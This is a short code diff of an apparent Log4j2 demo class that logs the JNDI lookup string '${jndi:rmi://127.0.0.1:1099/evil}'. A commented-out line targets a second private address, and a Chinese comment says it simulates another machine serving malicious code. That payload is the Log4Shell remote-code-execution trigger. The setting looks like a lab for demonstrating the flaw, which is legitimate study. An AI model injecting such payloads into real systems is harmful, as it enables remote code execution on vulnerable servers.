@@ -115,10 +115,10 @@ public class Log4j2Demo {
         System.out.println("begin of print log...");
 
         String logContent = "${jndi:rmi://127.0.0.1:1099/evil}";
+        // 模拟另外一台机器运行恶意代码
+//        String logContent = "${jndi:rmi://192.168.3.57:1099/evil}";
         LOGGER.error("hello, {}", logContent);
-
         System.out.println("end of print log...");
-
     }
 }
 ```
